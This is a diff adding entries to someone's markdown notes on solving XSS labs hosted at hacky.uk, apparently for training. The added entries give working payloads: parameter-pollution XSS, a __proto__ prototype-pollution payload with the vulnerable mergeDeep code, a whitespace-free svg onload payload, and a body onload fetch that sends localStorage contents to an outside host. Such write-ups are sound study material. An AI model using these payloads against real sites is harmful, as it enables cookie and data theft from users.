@@ -614,7 +614,67 @@ That will be XSS in POST Method => create CSRF POC, Host in server, & deliver to
 when victim click, xss will trigger in their account => CSRF + POST XSS = Valid XSS
 
 ---
+### Lab 1803: Length Limit Bypass 2
+- **URL Lab**: https://hacky.uk/lab/1803
+- **Payload**: 
+```html
+name=<img%20&name=src=x%20&name=onerror=alert&name=(document.cookie)
+```
+- **Full URL**: 
+```
+https://2dhjahxc.hacky.uk/target.ftl?name=%3Cimg%20&name=src=x%20&name=onerror=alert&name=(document.cookie)%3E
+```
+- **Description**: XSS limit bypass via parameter pollution. All the payload I split in to several part & inject to the name value using parameter pollution
 
+---
+
+### Lab 1568: Following Protocol => Protype pollution
+- **URL Lab**: https://hacky.uk/lab/1568
+- **Payload**: 
+```html
+{"__proto__":{"func":"alert(document.cookie)"}}
+```
+- **Full URL**: 
+```
+https://af5r3yii.hacky.uk/target.ftl?query={%22__proto__%22:{%22func%22:%22alert(document.cookie)%22}}
+```
+- **Description**: Code mergedep iterate all key from source object. When we supply {"__proto__":{"func":"alert(document.cookie)"}}. The sink of setTimeout will be proccess & reflect this alert to the UI
+Vulnerable Code:
+```
+for (const key in source) {
+    if (isObject(source[key])) {
+        if (!target[key]) Object.assign(target, { [key]: {} });
+        mergeDeep(target[key], source[key]);  // ← BAHAYA
+    }
+```
+
+---
+### Lab 347: Capture Local Storage
+- **URL Lab**: https://hacky.uk/lab/347
+- **Payload**: 
+```html
+<body onload="fetch('https://eqh42jmm.hacky.uk/index.html?flag=' + localStorage.getItem('flag'), {mode: 'no-cors'})">
+```
+- **Full URL**: 
+```
+https://qkyzh2al.hacky.uk/target.ftl?name=%3Cbody%20onload%3D%22fetch(%27https%3A%2F%2Feqh42jmm.hacky.uk%2Findex.html%3Fflag%3D%27%20%2B%20localStorage.getItem(%27flag%27)%2C%20%7Bmode%3A%20%27no-cors%27%7D)%22%3E
+```
+- **Description**: grep the flag in server & then submitted
+
+---
+### Lab 1868: DOM XSS no Whitespace
+- **URL Lab**: https://hacky.uk/lab/1868
+- **Payload**: 
+```html
+<svg/onload=alert(document.cookie)>
+```
+- **Full URL**: 
+```
+https://eu24qnhm.hacky.uk/target.ftl?name=%3Csvg/onload=alert(document.cookie)%3E
+```
+- **Description**: the backend filter every space, we bypass it using /, browser threat as space
+
+---
 
 ## Adept Level
 
